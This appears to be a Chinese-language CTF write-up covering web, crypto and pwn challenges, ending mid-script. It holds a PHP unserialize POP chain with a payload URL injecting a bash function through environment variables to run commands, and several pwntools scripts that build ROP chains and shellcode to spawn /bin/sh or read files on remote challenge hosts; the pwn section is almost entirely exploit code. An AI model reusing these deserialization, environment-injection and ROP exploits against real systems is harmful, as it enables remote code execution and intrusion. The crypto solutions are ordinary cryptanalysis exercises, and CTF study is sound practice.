unserialize‍源代码&lt;?phphighlight_file(__FILE__);class start{    public $welcome;    public $you;    public function __destruct()    {        $this-&gt;begin0fweb();    }    public  function begin0fweb()    {        $p='hacker!';        $this-&gt;welcome-&gt;you = $p;    }}class SE{    public $year;    public function __set($name, $value){        echo '  Welcome to new year!  ';        echo($this-&gt;year);    }}class CR {    public $last;    public $newyear;    public function __tostring() {        if (is_array($this-&gt;newyear)) {            echo 'nonono';            return false;        }        if (!preg_match('/worries/i',$this-&gt;newyear))        {            echo \"empty it!\";            return 0;        }        if(preg_match('/^.*(worries).*$/',$this-&gt;newyear)) {            echo 'Don\\'t be worry';        } else {            echo 'Worries doesn\\'t exists in the new year  ';            empty($this-&gt;last-&gt;worries);        }        return false;    }}class ET{    public function __isset($name)    {        foreach ($_GET['get'] as $inject =&gt; $rce){            putenv(\"{$inject}={$rce}\");        }        system(\"echo \\\"Haven't you get the secret?\\\"\");    }}if(isset($_REQUEST['go'])){    unserialize(base64_decode($_REQUEST['go']));}?&gt;php反序列化，先找到入口点statr—-&gt;destruct—–&gt;begin0fweb​—–&gt;SE—–&gt;set—-&gt;tostring——&gt;isset根据上面的链子编写exp&lt;?phpclass start{    public $welcome;    public $you;}class SE{    public $year;}class CR {    public $last;    public $newyear;}class ET{}$s = new start;$s-&gt;welcome = new SE;$s-&gt;welcome-&gt;year = new CR;#这里大小写绕过一下$s-&gt;welcome-&gt;year-&gt;newyear = \"Worries\";$s-&gt;welcome-&gt;year-&gt;last = new ET;echo base64_encode(serialize($s));?&gt;​​‍成功的来到了这里，接下来就是一个老生常谈的一个考点了，环境变量注入p牛的文章狠狠的推荐一遍https://www.leavesongs.com/PENETRATION/how-I-hack-bash-through-environment-injection.html最后的payloadhttp://yuanshen.life:39676/?go=Tzo1OiJzdGFydCI6Mjp7czo3OiJ3ZWxjb21lIjtPOjI6IlNFIjoxOntzOjQ6InllYXIiO086MjoiQ1IiOjI6e3M6NDoibGFzdCI7TzoyOiJFVCI6MDp7fXM6NzoibmV3eWVhciI7czo3OiJXb3JyaWVzIjt9fXM6MzoieW91IjtOO30&amp;get[BASH_FUNC_echo%25%25]=() { cat /ffffllllllaaaaaaaaaaaaaaaaaaggggg; }‍​​‍‍‍Crypto签到Vigenere‍Gn taj xirly gf Fxgjuakd, oe igywnd mt tegbs mnrxxlrivywd sngearbsw wakksre. Bs kpimj gf tank, it bx gur bslenmngn th jfdetagur mt ceei yze Ugnled Lystel tx Amxwaca gjmtrtq.An taj wvegy gf tank nom xmccxjvinz, bw prhugse ts sllbffce hs lhe ytdlopnfg btxas wbyz Meqnuo: Tafl we lmsll ffce wtw logxyzer tsv madj heavj logxyzer. Pj khaeq yivLNUTF{4695vft9-fd68-4684-uj81-u6c1avg6uaft}j yenxwgus ynfanvnsl snuhorm, ffd ag zfdekxlanwnfg og tmr ptwl thty Eexbhg is mt jechsiuek yze lhxl tekwatokd an Nxb Eexbhg, Teqfk, anw Fjizhss. Thx iwtabqk of ljltlxrwnt tww leyy lo yhz.Qou tww inlyjucmjv to bsxorf yze Pkjkidxsl [of Fjpich] tx thx ftovx nf thx ljeamjkt chsxidxsue al xgon tx at il hwrttnf thty lhekj oile gw an hzlbrxfc of pfj wimm lhe Nsatew Xlatxx snd lzygely lham yze Pkjkidxsl, on ank owg nfitbflivx, nfvimj Bapts lo ifrwdityw adajjenvj oita yzis iqsn; am yze strw tifj, gffxw lo mxiaatx gwtwxjf Jaiff anw tmrsxqnes.Iqwasx hsll mt lhe tylenmngn oy yze Pkjkidxsl thty lhe kzlhlxxk emiqgymxsl of hzj suursrigjk nop txfekx lhe iwgspxhl of vtepeeqang Xsylagi lo mtpw pethw in t kww mhslhs.https://www.guballa.de/vigenere-solver‍​​‍签到，确信！题目附件from Crypto.Util.number import *from enc import flagm = bytes_to_long(flag)def gen_keys(bits):    while 1:        p = getPrime(bits)        q = sum([p**i for i in range(7)])        if isPrime(q):            r = getPrime(1024)            n = p*q*r            return p,np,n = gen_keys(512)e = 65537c = pow(m,e,n)print(f\"n = {n}\")print(f\"e = {e}\")print(f\"c = {c}\")'''n = 8361361624563191168612863710516449028280757632934603412143152925186847721821552879338608951120157631182699762833743097837368740526055736516080136520584848113137087581886426335191207688807063024096128001406698217998816782335655663803544853496060418931569545571397849643826584234431049002394772877263603049736723071392989824939202362631409164434715938662038795641314189628730614978217987868150651491343161526447894569241770090377633602058561239329450046036247193745885174295365633411482121644408648089046016960479100220850953009927778950304754339013541019536413880264074456433907671670049288317945540495496615531150916647050158936010095037412334662561046016163777575736952349827380039938526168715655649566952708788485104126900723003264019513888897942175890007711026288941687256962012799264387545892832762304320287592575602683673845399984039272350929803217492617502601005613778976109701842829008365226259492848134417818535629827769342262020775115695472218876430557026471282526042545195944063078523279341459199475911203966762751381334277716236740637021416311325243028569997303341317394525345879188523948991698489667794912052436245063998637376874151553809424581376068719814532246179297851206862505952437301253313660876231136285877214949094995458997630235764635059528016149006613720287102941868517244509854875672887445099733909912598895743707420454623997740143407206090319567531144126090072331e = 65537c = 990174418341944658163682355081485155265287928299806085314916265580657672513493698560580484907432207730887132062242640756706695937403268682912083148568866147011247510439837340945334451110125182595397920602074775022416454918954623612449584637584716343806255917090525904201284852578834232447821716829253065610989317909188784426328951520866152936279891872183954439348449359491526360671152193735260099077198986264364568046834399064514350538329990985131052947670063605611113730246128926850242471820709957158609175376867993700411738314237400038584470826914946434498322430741797570259936266226325667814521838420733061335969071245580657187544161772619889518845348639672820212709030227999963744593715194928502606910452777687735614033404646237092067644786266390652682476817862879933305687452549301456541574678459748029511685529779653056108795644495442515066731075232130730326258404497646551885443146629498236191794065050199535063169471112533284663197357635908054343683637354352034115772227442563180462771041527246803861110504563589660801224223152060573760388045791699221007556911597792387829416892037414283131499832672222157450742460666013331962249415807439258417736128976044272555922344342725850924271905056434303543500959556998454661274520986141613977331669376614647269667276594163516040422089616099849315644424644920145900066426839607058422686565517159251903275091124418838917480242517812783383'''参考ImaginaryCTF 2023 sushttps://tangcuxiaojikuai.xyz/post/ea445335.html解题#sagefrom Crypto.Util.number import *n = 8361361624563191168612863710516449028280757632934603412143152925186847721821552879338608951120157631182699762833743097837368740526055736516080136520584848113137087581886426335191207688807063024096128001406698217998816782335655663803544853496060418931569545571397849643826584234431049002394772877263603049736723071392989824939202362631409164434715938662038795641314189628730614978217987868150651491343161526447894569241770090377633602058561239329450046036247193745885174295365633411482121644408648089046016960479100220850953009927778950304754339013541019536413880264074456433907671670049288317945540495496615531150916647050158936010095037412334662561046016163777575736952349827380039938526168715655649566952708788485104126900723003264019513888897942175890007711026288941687256962012799264387545892832762304320287592575602683673845399984039272350929803217492617502601005613778976109701842829008365226259492848134417818535629827769342262020775115695472218876430557026471282526042545195944063078523279341459199475911203966762751381334277716236740637021416311325243028569997303341317394525345879188523948991698489667794912052436245063998637376874151553809424581376068719814532246179297851206862505952437301253313660876231136285877214949094995458997630235764635059528016149006613720287102941868517244509854875672887445099733909912598895743707420454623997740143407206090319567531144126090072331e = 65537c = 990174418341944658163682355081485155265287928299806085314916265580657672513493698560580484907432207730887132062242640756706695937403268682912083148568866147011247510439837340945334451110125182595397920602074775022416454918954623612449584637584716343806255917090525904201284852578834232447821716829253065610989317909188784426328951520866152936279891872183954439348449359491526360671152193735260099077198986264364568046834399064514350538329990985131052947670063605611113730246128926850242471820709957158609175376867993700411738314237400038584470826914946434498322430741797570259936266226325667814521838420733061335969071245580657187544161772619889518845348639672820212709030227999963744593715194928502606910452777687735614033404646237092067644786266390652682476817862879933305687452549301456541574678459748029511685529779653056108795644495442515066731075232130730326258404497646551885443146629498236191794065050199535063169471112533284663197357635908054343683637354352034115772227442563180462771041527246803861110504563589660801224223152060573760388045791699221007556911597792387829416892037414283131499832672222157450742460666013331962249415807439258417736128976044272555922344342725850924271905056434303543500959556998454661274520986141613977331669376614647269667276594163516040422089616099849315644424644920145900066426839607058422686565517159251903275091124418838917480242517812783383k = 7R = Zmod(n)[\"x\"]while True:    Q = R.quo(R.random_element(k))    pp = gcd(ZZ(list(Q.random_element() ^ n)[1]), n)    if pp != 1:        qq = sum([pp**i for i in range(k)])        rr = n // (pp * qq)        assert n == pp * qq * rr        breakphi = (pp - 1) * (qq - 1) * (rr - 1)d = pow(e, -1, phi)m = pow(c, d, n)print(long_to_bytes(int(m)))‍‍‍SuperbRSA题目附件#user:mumu666from Crypto.Util.number import *p=getPrime(1024)q=getPrime(1024)n=p*qe1=55e2=200m=bytes_to_long(\"flag\")assert(pow(m,5) &lt; n)c1 = pow(m, e1, n)c2 = pow(m, e2, n)print(\"n=\",n)print(\"c1=\",c1)print(\"c2=\",c2)n= 19006830358118902392432453595802675566730850352890246995920642811967821259388009049803513102750594524106471709641202019832682438027312468849299985832675191795417160553379580813410722359089872519372049229233732405993062464286888889084640878784209014165871696882564834896322508054231777967011195636564463806270998326936161449009988434249178477100127347406759932149010712091376183710135615375272671888541233275415737155953323133439644529709898791881795186775830217884663044495979067807418758455237701315019683802437323177125493076113419739827430282311018083976114158159925450746712064639569301925672742186294237113199023c1= 276245243658976720066605903875366763552720328374098965164676247771817997950424168480909517684516498439306387133611184795758628248588201187138612090081389226321683486308199743311842513053259894661221013008371261704678716150646764446208833447643781574516045641493770778735363586857160147826684394417412837449465273160781074676966630398315417741542529612480836572205781076576325382832502694868883931680720558621770570349864399879523171995953720198118660355479626037129047327185224203109006251809257919143284157354935005710902589809259500117996982503679601132486140677013625335552533104471327456798955341220640782369529c2= 11734019659226247713821792108026989060106712358397514827024912309860741729438494689480531875833287268454669859568719053896346471360750027952226633173559594064466850413737504267807599435679616522026241111887294138123201104718849744300769676961585732810579953221056338076885840743126397063074940281522137794340822594577352361616598702143477379145284687427705913831885493512616944504612474278405909277188118896882441812469679494459216431405139478548192152811441169176134750079073317011232934250365454908280676079801770043968006983848495835089055956722848080915898151352242215210071011331098761828031786300276771001839021变形题 gcd(e1,e2)!=1假设gcd(e1,e2)=x(c1^s1*c2^s2)%n==m1^x%nm=m1^x%nm = m1^x+kne1e2不互素解题#user:mumu666from Crypto.Util.number import *   e1=55e2=200n= 19006830358118902392432453595802675566730850352890246995920642811967821259388009049803513102750594524106471709641202019832682438027312468849299985832675191795417160553379580813410722359089872519372049229233732405993062464286888889084640878784209014165871696882564834896322508054231777967011195636564463806270998326936161449009988434249178477100127347406759932149010712091376183710135615375272671888541233275415737155953323133439644529709898791881795186775830217884663044495979067807418758455237701315019683802437323177125493076113419739827430282311018083976114158159925450746712064639569301925672742186294237113199023c1= 276245243658976720066605903875366763552720328374098965164676247771817997950424168480909517684516498439306387133611184795758628248588201187138612090081389226321683486308199743311842513053259894661221013008371261704678716150646764446208833447643781574516045641493770778735363586857160147826684394417412837449465273160781074676966630398315417741542529612480836572205781076576325382832502694868883931680720558621770570349864399879523171995953720198118660355479626037129047327185224203109006251809257919143284157354935005710902589809259500117996982503679601132486140677013625335552533104471327456798955341220640782369529c2= 11734019659226247713821792108026989060106712358397514827024912309860741729438494689480531875833287268454669859568719053896346471360750027952226633173559594064466850413737504267807599435679616522026241111887294138123201104718849744300769676961585732810579953221056338076885840743126397063074940281522137794340822594577352361616598702143477379145284687427705913831885493512616944504612474278405909277188118896882441812469679494459216431405139478548192152811441169176134750079073317011232934250365454908280676079801770043968006983848495835089055956722848080915898151352242215210071011331098761828031786300276771001839021import gmpy2import libnum_,s1,s2 = gmpy2.gcdext(e1,e2)m1 = (pow(c1,s1,n)*pow(c2,s2,n))%nprint(m1)x = gmpy2.gcd(e1,e2)print(x)k=0while 1:    m11 = m1+k*n    m,s = gmpy2.iroot(m11,x)    if s:        print(libnum.n2s(int(m)))        break    k+=1‍‍easyLattice题目附件from Crypto.Util.number import *from secret import flagimport gmpy2assert len(flag) == 47f = bytes_to_long(flag)p = getPrime(512)g = getPrime(128)h = gmpy2.invert(f, p) * g % pprint('h =', h)print('p =', p)\"\"\"h = 9848463356094730516607732957888686710609147955724620108704251779566910519170690198684628685762596232124613115691882688827918489297122319416081019121038443p = 11403618200995593428747663693860532026261161211931726381922677499906885834766955987247477478421850280928508004160386000301268285541073474589048412962888947   \"\"\"NTRU格密码参考链接https://www.cnblogs.com/sCh3n/p/15917388.html解题from Crypto.Util.number import *h = 9848463356094730516607732957888686710609147955724620108704251779566910519170690198684628685762596232124613115691882688827918489297122319416081019121038443p = 11403618200995593428747663693860532026261161211931726381922677499906885834766955987247477478421850280928508004160386000301268285541073474589048412962888947     #f=1427527382696592338597148457263770558761219491396746016810215766179780194787443388228681575452119269880711319897410623591L = Matrix(ZZ, [[1, h*(2**250)],                [0, p*(2**250)]])f, g = L.LLL()[0]print(long_to_bytes(-f))‍‍gggcccddd题目附件from Crypto.Util.number import *from enc import flagm = bytes_to_long(flag)p = getPrime(512)q = getPrime(512)n = p*qe = 65537c1 = pow(m,e,n)c2 = pow(233*m+9527,e,n)print(f'n = {n}')print(f'c1 = {c1}')print(f'c2 = {c2}')print(f'e = {e}')\"\"\"n = 71451784354488078832557440841067139887532820867160946146462765529262021756492415597759437645000198746438846066445835108438656317936511838198860210224738728502558420706947533544863428802654736970469313030584334133519644746498781461927762736769115933249195917207059297145965502955615599481575507738939188415191c1 = 60237305053182363686066000860755970543119549460585763366760183023969060529797821398451174145816154329258405143693872729068255155086734217883658806494371105889752598709446068159151166250635558774937924668506271624373871952982906459509904548833567117402267826477728367928385137857800256270428537882088110496684c2 = 20563562448902136824882636468952895180253983449339226954738399163341332272571882209784996486250189912121870946577915881638415484043534161071782387358993712918678787398065688999810734189213904693514519594955522460151769479515323049821940285408228055771349670919587560952548876796252634104926367078177733076253e = 65537\"\"\"franklin-Reiter相关消息攻击参考链接https://blog.csdn.net/XiongSiqi_blog/article/details/130978226?spm=1001.2014.3001.5502解题from Crypto.Util.number import *n = 71451784354488078832557440841067139887532820867160946146462765529262021756492415597759437645000198746438846066445835108438656317936511838198860210224738728502558420706947533544863428802654736970469313030584334133519644746498781461927762736769115933249195917207059297145965502955615599481575507738939188415191c1 = 60237305053182363686066000860755970543119549460585763366760183023969060529797821398451174145816154329258405143693872729068255155086734217883658806494371105889752598709446068159151166250635558774937924668506271624373871952982906459509904548833567117402267826477728367928385137857800256270428537882088110496684c2 = 20563562448902136824882636468952895180253983449339226954738399163341332272571882209784996486250189912121870946577915881638415484043534161071782387358993712918678787398065688999810734189213904693514519594955522460151769479515323049821940285408228055771349670919587560952548876796252634104926367078177733076253e = 65537def attack(c1, c2):    PR.&lt;x&gt;=PolynomialRing(Zmod(n))    g1 = x^e - c1    g2 = (233*x+9527)^e - c2    def gcd(g1, g2):        while g2:            g1, g2 = g2, g1 % g2            if(g2.degree() % 100 == 0):                print(g2.degree())        return g1.monic()    return -gcd(g1, g2)[0]m1 = attack(c1, c2)flag = long_to_bytes(int(m1))print(flag)‍‍‍‍‍‍Pwn  基本贴的都是脚本，没详解‍[签到]stackfrom pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)lss     = lambda s                  :log.success('\\033[1;31;40m%s --&gt; 0x%x \\033[0m' % (s, eval(s)))context.arch      = 'amd64'context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','130']def start(binary,argv=[], *a, **kw):    '''Start the exploit against the target.'''    if args.GDB:        return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw)    elif args.RE:        return remote()    else:        return process([binary] + argv, *a, **kw)binary = ''libelf = ''if (binary!=''): elf  = ELF(binary) ; rop=ROP(binary);libc = elf.libcif (libelf!=''): libc = ELF(libelf)gdbscript = '''continue'''.format(**locals())io = remote('yuanshen.life',33275)#io = process('./pwn')ru(\":\")sl(str(0x230))#gdb.attach(io)ru('command: ')pay = b'cat flag'.ljust(0x58,b'\\x00') + p64(0x04011F7)sl(pay)#gdb.attach(io,gdbscript)io.interactive()‍‍(🩸) [进阶]TalkBoom ()  获取可以 执行到 mov edi,0x100​ 的 token 吧from elftools.elf.elffile import ELFFilefrom pwn import *elf_filename  = './SphinxBomb1'elf = ELF(elf_filename)function_address = elf.symbols#print(function_address)for i in function_address:    if 'main' in i:        backdoor  = function_address[i]        bd_name = i        break#cross_references = []#function_name = bd_nameprint(\"main:\",hex(backdoor))print(\"name:\",bd_name)def find_mov_instructions(elf_filename, start_address, end_address):    mov_addresses = []    with open(elf_filename, 'rb') as f:        elffile = ELFFile(f)        # 遍历所有节        for section in elffile.iter_sections():            # 只查找可执行节            if section.header['sh_type'] == 'SHT_PROGBITS':                data = section.data()                # 计算节的起始地址和结束地址                section_start = section.header['sh_addr']                section_end = section_start + section.header['sh_size']                # 如果节的结束地址在指定范围之外，则跳过该节                if section_end &lt; start_address or section_start &gt; end_address:                    continue                # 在节中搜索 mov edi, 0x100 指令                offset = 0                while offset &lt; len(data):                    # 判断指令是否为 mov edi, 0x100                    if data[offset] == 0xBF and data[offset+1:offset+5] == b'\\x00\\x01\\x00\\x00':                        instr_addr = section_start + offset                        # 如果指令地址在指定范围内，则将其添加到结果列表中                        if instr_addr &gt;= start_address and instr_addr &lt;= end_address:                            mov_addresses.append(instr_addr)                    offset += 1    return mov_addressesstart_address = backdoorend_address = backdoor + 0xF00elf_filename  = './SphinxBomb1'mov_addresses = find_mov_instructions(elf_filename, start_address, end_address)print(\"Addresses of 'mov edi, 0x100' instructions in the range {} - {}:\".format(hex(start_address), hex(end_address)))print(mov_addresses)#exit()for addr in mov_addresses:    t = addr - 0x31print('[+] ', hex(t))def read_bytes_at_address(target_addr):    with open(elf_filename, 'rb') as f:        # 定位到指定地址        data = f.read()        for addrs in range(0x2000,0x48000):            if  data[addrs] == 0x0f:                if  data[addrs + 1] == 0x84:                    p = (u32(data[addrs+2:addrs+6]) + 6 + addrs) + 0x400000                    if p == target_addr:                        return addrs + 0x400000target_addr = trs = read_bytes_at_address(target_addr)print(hex(rs))le = rs - 0x17 + 3f = open(elf_filename,'rb')f.seek(le-0x400000)offset1 = le + 4 + u32(f.read(4))print('token_addr:',hex(offset1))f.seek(offset1 - 0x400000)token = f.read(0x40)print('&gt;&gt;&gt;'+token.decode())‍​​‍‍  完整 exploit 脚本from pwn import *import oss       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)lss     = lambda s                  :log.success('\\033[1;31;40m%s --&gt; 0x%x \\033[0m' % (s, eval(s)))context.arch      = 'amd64'context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','130']def start(binary,argv=[], *a, **kw):    '''Start the exploit against the target.'''    if args.GDB:        return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw)    elif args.RE:        return remote()    else:        return process([binary] + argv, *a, **kw)#io = remote('yuanshen.life',10001)io = remote('112.124.59.213',10001)#io = process('./SphinxBomb1')ru('std::io::stdin().read_line(&amp;mut line);')ru('+++\\n')f = open('SphinxBomb1.gz','wb')# 保存 文件ru('This is your Bomb: \\n')ru(\"b'\")f.write(b64d(ru(\"'\\n\").decode()))#gdb.attach(io,'b *0x0405575')f.close()#pause()os.system('gzip -d SphinxBomb1')os.system('ls')ru('Welcome. Now,you can talk with Sphinx. Good luck.\\n')from elftools.elf.elffile import ELFFileelf_filename  = './SphinxBomb1'elf = ELF(elf_filename)function_address = elf.symbols#print(function_address)for i in function_address:    if 'main' in i:        backdoor  = function_address[i]        bd_name = i        break#cross_references = []#function_name = bd_nameprint(\"main:\",hex(backdoor))print(\"name:\",bd_name)# ChatGPTdef find_mov_instructions(elf_filename, start_address, end_address):    mov_addresses = []    with open(elf_filename, 'rb') as f:        elffile = ELFFile(f)        # 遍历所有节        for section in elffile.iter_sections():            # 只查找可执行节            if section.header['sh_type'] == 'SHT_PROGBITS':                data = section.data()                # 计算节的起始地址和结束地址                section_start = section.header['sh_addr']                section_end = section_start + section.header['sh_size']                # 如果节的结束地址在指定范围之外，则跳过该节                if section_end &lt; start_address or section_start &gt; end_address:                    continue                # 在节中搜索 mov edi, 0x100 指令                offset = 0                while offset &lt; len(data):                    # 判断指令是否为 mov edi, 0x100                    if data[offset] == 0xBF and data[offset+1:offset+5] == b'\\x00\\x01\\x00\\x00':                        instr_addr = section_start + offset                        # 如果指令地址在指定范围内，则将其添加到结果列表中                        if instr_addr &gt;= start_address and instr_addr &lt;= end_address:                            mov_addresses.append(instr_addr)                    offset += 1    return mov_addressesstart_address = backdoorend_address = backdoor + 0x900mov_addresses = find_mov_instructions(elf_filename, start_address, end_address)print(\"Addresses of 'mov edi, 0x100' instructions in the range {} - {}:\".format(hex(start_address), hex(end_address)))for addr in mov_addresses:    t = addr - 0x31    print('yes.....')print('[+] ', hex(t))def read_bytes_at_address(target_addr):    with open(elf_filename, 'rb') as f:        # 定位到指定地址        data = f.read()        for addrs in range(0x2000,0x48000):            if  data[addrs] == 0x0f:                if  data[addrs + 1] == 0x84:                    p = (u32(data[addrs+2:addrs+6]) + 6 + addrs) + 0x400000                    if p == target_addr:                        return addrs + 0x400000target_addr = trs = read_bytes_at_address(target_addr)print(hex(rs))le = rs - 0x17 + 3f = open(elf_filename,'rb')f.seek(le-0x400000)offset1 = le + 4 + u32(f.read(4))print('token_addr:',hex(offset1))f.seek(offset1 - 0x400000)token = f.read(0x40)print('&gt;&gt;&gt;'+token.decode())sl(token)rop = ROP('./SphinxBomb1')elf = ELF('./SphinxBomb1')try:    rax = rop.find_gadget(['pop rax','ret'])[0]    rdi = rop.find_gadget(['pop rdi','ret'])[0]    rsi = rop.find_gadget(['pop rsi','ret'])[0]    rcx = rop.find_gadget(['pop rcx','ret'])[0]except:    print('no gadget')    exit()mov_rdx_rcx = next(elf.search(asm('mov rdx,rcx; ret')))mov_rdx_rcx = next(elf.search(asm('mov rdx,rcx; ret')))syscall     = next(elf.search(asm('mov rdx, 0x1D; mov rax, 1; syscall'))) + 14pay = b'A' * 0x38pay += p64(rcx) + p64(0x1000)pay += p64(mov_rdx_rcx)pay += p64(0x404E88)pause()s(pay)pay = b'A' * 0x38pay += p64(rax) + p64(0)pay += p64(rdi) + p64(0)pay += p64(rsi) + p64(0x460000+0x800)pay += p64(syscall)pay += b'A' * 104pay += p64(rax) + p64(0x3b)pay += p64(rdi) + p64(0x460000+0x800)pay += p64(rsi) + p64(0)pay += p64(rcx) + p64(0)pay += p64(mov_rdx_rcx)pay += p64(syscall)pause()s(pay)#pause()sl('/bin/sh\\x00')#io.interactive()‍‍‍​​‍‍‍(🩸)[进阶]Bug_Zapper_Pro+from pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)lss     = lambda s                  :log.success('\\033[1;31;40m%s --&gt; 0x%x \\033[0m' % (s, eval(s)))context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','130']def start(binary,argv=[], *a, **kw):    '''Start the exploit against the target.'''    if args.GDB:        return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw)    elif args.RE:        return remote()    else:        return process([binary] + argv, *a, **kw)binary = './bugzapper_pro'libelf = ''if (binary!=''): elf  = ELF(binary) ; rop=ROP(binary);libc = elf.libcif (libelf!=''): libc = ELF(libelf)gdbscript = '''continue'''.format(**locals())sc  ='''push ebxpush ebxpush rax'''# pwndbg&gt; si# 0x0000000114514fe0 in ?? ()# LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA# ──────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────────────────# RAX  0x114514fe0 ◂— nop  /* 0x9090909090909090 */# RBX  0x0# RCX  0x0# RDX  0x0# RDI  0x0# RSI  0x0# R8   0x0# R9   0x0# R10  0x0# R11  0x0# R12  0x0# R13  0x0# R14  0x0# R15  0x0# RBP  0x0# *RSP  0x7ffdad853ee8 —▸ 0x4010fb (end) ◂— mov rdi, 1# *RIP  0x114514fe0 ◂— nop  /* 0x9090909090909090 */# ───────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]───────────────────────────────────────────────# ► 0x114514fe0    nop  # 0x114514fe1    nop  # 0x114514fe2    nop  # 0x114514fe3    nop  # 0x114514fe4    nop  # 0x114514fe5    nop  # 0x114514fe6    nop  # 0x114514fe7    nop  # 0x114514fe8    nop  # 0x114514fe9    nop  # 0x114514fea    nop  # ────────────────────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────────────────────# 00:0000│ rsp 0x7ffdad853ee8 —▸ 0x4010fb (end) ◂— mov rdi, 1# 01:0008│     0x7ffdad853ef0 ◂— 0x1# 02:0010│     0x7ffdad853ef8 —▸ 0x7ffdad854386 ◂— './bugzapper_pro'# 03:0018│     0x7ffdad853f00 ◂— 0x0# 04:0020│     0x7ffdad853f08 —▸ 0x7ffdad854396 ◂— 'COLORTERM=truecolor'# 05:0028│     0x7ffdad853f10 —▸ 0x7ffdad8543aa ◂— 'DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/0/bus'# 06:0030│     0x7ffdad853f18 —▸ 0x7ffdad8543dd ◂— 'DESKTOP_SESSION=ubuntu'# 07:0038│     0x7ffdad853f20 —▸ 0x7ffdad8543f4 ◂— 'DISPLAY=:0'# ──────────────────────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────────────────────# ► 0      0x114514fe0# 1         0x4010fb end# 2              0x1# 3   0x7ffdad854386# 4              0x0#io = remote('yuanshen.life',36747)io = process('./bugzapper_pro')io.recvuntil('&gt;&gt;&gt; ')#context.arch      = 'i386'#sc = '''#sub    al, 0x36#'''## '0x5e4a3c'## &gt;&gt;&gt; hex(0x514faa ^ 0x0f0596)##bd = b'\\x31\\x42\\x6b'#bd = b'\\x31\\x40\\x3e' # eax##bd = b'\\x31\\x70\\x6b' # esi##bd = b'\\x31\\x30'#sc = asm(sc) + bd#sc += asm('''#pop edx#push eax#pop esi#''')##sc += b'\\x5e\\x4a\\x3c'#sc += b'\\x54\\x40\\x39'[::-1]sc = bytes.fromhex('2c 36 31 40  3e 5a 50 5e  39 40 54'.replace(' ',''))print(disasm(sc))print(hexdump(sc))gdb.attach(io,'b *0x401098')s(sc)pause()#context.arch      = 'amd64'sc = '''mov rsi, 0x114514000xor rax,raxxor rdi,rdisyscalljmp rsi'''pay = asm(sc).rjust(0x4a,b'\\x90')s(pay)#pause()pay = asm(shellcraft.open('flag'))pay += asm(shellcraft.sendfile('1','rax',0,0x50))#pay = asm(shellcraft.sh())sl(pay)io.interactive()‍  只能使用 可见字符‍​​‍​​‍​​​​‍‍‍(🩸)overflow‍from pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)lss     = lambda s                  :log.success('\\033[1;31;40m%s --&gt; 0x%x \\033[0m' % (s, eval(s)))context.arch      = 'amd64'context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','130']def start(binary,argv=[], *a, **kw):    '''Start the exploit against the target.'''    if args.GDB:        return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw)    elif args.RE:        return remote()    else:        return process([binary] + argv, *a, **kw)binary = './overflow'libelf = ''if (binary!=''): elf  = ELF(binary) ; rop=ROP(binary);libc = elf.libcif (libelf!=''): libc = ELF(libelf)gdbscript = '''b *0x401442'''.format(**locals())io = start(binary)io = remote('yuanshen.life',36365)#gdb.attach(io,'b *0x40132c')#pay =  + p64(0x401372) * 0x30#pay =  b'1111111122222222' +p64(0x401056) +p64(0x04011D0)+p64(0x401076)+(88-0x28) * b'A' +p64(0x401372)+ p64(0x404000) * 0x10#pay =  b'1111111122222222' +b'B'*8 +p64(0x04011D0)+p64(0x401076)+(88-0x28) * b'A' +p64(0x401372)+ p64(0x404000) * 0x10pay =  p64(0x04011D0)+p64(0x401076)+(88-0x28) * b'A' +p64(0x401372)+ p64(0x404000+0x18) * 0x10#pay =  p64(0x04011D0)+p64(0x401076)+(88-0x28) * b'A' +p64(0x401372)+ p64(0x404000+0x10) * 0x10sl(pay)io.interactive()‍‍(🩸)Eeeeasy_Cpp  本来几分钟就可以打下来的，奈何没有第一时间看到 backdoor 这个后门函数，  导致后面 本地环境可getshell ，远程死活不行，搞半年。from pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)itr     = lambda                    